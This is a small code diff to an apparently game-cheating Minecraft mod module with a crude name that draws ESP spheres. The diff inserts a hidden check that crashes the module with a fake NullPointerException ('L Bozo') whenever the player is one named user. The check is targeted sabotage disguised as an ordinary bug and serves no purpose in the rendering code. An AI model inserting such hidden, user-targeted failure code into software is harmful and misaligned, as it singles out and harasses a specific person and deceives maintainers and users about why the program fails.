@@ -114,6 +114,10 @@ public class PenisEsp extends Module {
         List<Vec3d> vec3ds = new ArrayList<>();
         float alpha, beta;
 
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         for (alpha = 0.0f; alpha < Math.PI; alpha += Math.PI / gradation.get()) {
             for (beta = 0.0f; beta < 2.01f * Math.PI; beta += Math.PI / gradation.get()) {
                 double x1 = (float) (vec3d.getX() + (radius * Math.cos(beta) * Math.sin(alpha)));
